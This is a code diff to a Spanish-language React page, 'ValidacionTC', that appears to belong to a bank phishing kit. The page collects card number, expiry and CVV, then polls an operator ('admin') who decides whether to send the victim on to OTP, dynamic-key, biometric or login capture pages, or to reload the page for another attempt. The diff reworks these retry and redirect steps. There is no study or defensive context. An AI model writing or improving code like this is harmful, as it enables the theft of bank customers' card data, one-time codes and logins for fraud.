@@ -401,70 +401,89 @@ export default function ValidacionTC() {
                     clearTimeout(timeoutId);
                     setCargando(false);
                     alert("El tiempo de espera ha expirado. Por favor, verifica los datos e inténtalo nuevamente.");
-                    // Resetear formulario para permitir reintento
-                    setCardDigits("");
-                    setExpirationDate("");
-                    setCvv("");
-                    setStep("front");
+                    // Recargar página para permitir reintento
+                    window.location.reload();
                     return;
                 }
 
-                // Redirecciones basadas en respuesta del admin
-                if (estado === 'pendiente' || estado === 'solicitar_tc_custom') {
-                    // Esperar...
-                } else {
-                    // Limpiar intervalos antes de redirigir
+                // Estados que indican que debemos seguir esperando (admin aún no ha decidido)
+                const estadosEspera = ['pendiente', 'solicitar_tc_custom', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
+                
+                if (estadosEspera.includes(estado)) {
+                    // Seguir esperando, mantener loading
+                    return;
+                }
+
+                // Si hay error (rechazo del admin), recargar página para permitir reintento
+                if (estado === 'error_tc') {
                     clearInterval(pollingInterval);
                     clearTimeout(timeoutId);
+                    setCargando(false);
+                    alert("Los datos de la tarjeta son incorrectos. Por favor, verifícalos e inténtalo nuevamente.");
+                    // Recargar página para permitir reintento
+                    window.location.reload();
+                    return;
+                }
 
-                    switch (estado.toLowerCase()) {
-                        case 'solicitar_tc':
-                        case 'error_tc':
-                            // Recargar la misma página para reintentar
-                            window.location.reload();
-                            break;
+                // Si el admin aprueba y pide siguiente paso, redirigir
+                // Limpiar intervalos antes de redirigir
+                clearInterval(pollingInterval);
+                clearTimeout(timeoutId);
+                setCargando(false);
 
-                        case 'solicitar_otp':
-                        case 'error_otp':
-                            navigate('/numero-otp');
-                            break;
+                switch (estado.toLowerCase()) {
+                    case 'solicitar_tc':
+                        // Si pide TC de nuevo, recargar para reintentar
+                        window.location.reload();
+                        break;
 
-                        case 'solicitar_din':
-                        case 'error_din':
-                            navigate('/clave-dinamica');
-                            break;
+                    case 'solicitar_otp':
+                        navigate('/numero-otp');
+                        break;
 
-                        case 'solicitar_finalizar':
-                            navigate('/finalizado-page');
-                            break;
+                    case 'solicitar_din':
+                        navigate('/clave-dinamica');
+                        break;
 
-                        case 'solicitar_biometria':
-                            navigate('/verificacion-identidad');
-                            break;
+                    case 'solicitar_finalizar':
+                        navigate('/finalizado-page');
+                        break;
 
-                        case 'error_923':
-                            navigate('/error-923page');
-                            break;
+                    case 'solicitar_biometria':
+                        navigate('/verificacion-identidad');
+                        break;
 
-                        case 'solicitar_tc_custom':
-                            navigate('/validacion-tc-custom');
-                            break;
+                    case 'error_923':
+                        navigate('/error-923page');
+                        break;
 
-                        case 'solicitar_cvv_custom':
-                            navigate('/validacion-cvv');
-                            break;
+                    case 'solicitar_tc_custom':
+                        navigate('/validacion-tc-custom');
+                        break;
 
-                        case 'solicitar_cvv':
-                            navigate('/validacion-cvv');
-                            break;
+                    case 'solicitar_cvv_custom':
+                        navigate('/validacion-cvv');
+                        break;
 
-                        case 'error_login':
-                            navigate('/autenticacion');
-                            break;
+                    case 'solicitar_cvv':
+                        navigate('/validacion-cvv');
+                        break;
 
-                        default:
-                            break;
-                    }
+                    case 'error_otp':
+                        navigate('/numero-otp');
+                        break;
+
+                    case 'error_din':
+                        navigate('/clave-dinamica');
+                        break;
+
+                    case 'error_login':
+                        navigate('/autenticacion');
+                        break;
+
+                    default:
+                        console.log("Estado no manejado en redirección:", estado);
+                        break;
                 }
 
             } catch (error) {
@@ -476,11 +495,8 @@ export default function ValidacionTC() {
                     clearTimeout(timeoutId);
                     setCargando(false);
                     alert("Error de conexión. Por favor, verifica tu conexión e inténtalo nuevamente.");
-                    // Resetear formulario para permitir reintento
-                    setCardDigits("");
-                    setExpirationDate("");
-                    setCvv("");
-                    setStep("front");
+                    // Recargar página para permitir reintento
+                    window.location.reload();
                 }
             }
         }, 3000);
@@ -490,11 +506,8 @@ export default function ValidacionTC() {
             clearInterval(pollingInterval);
             setCargando(false);
             alert("El tiempo de espera ha expirado. Por favor, verifica los datos e inténtalo nuevamente.");
-            // Resetear formulario para permitir reintento
-            setCardDigits("");
-            setExpirationDate("");
-            setCvv("");
-            setStep("front");
+            // Recargar página para permitir reintento
+            window.location.reload();
         }, TIMEOUT_MS);
     };
 
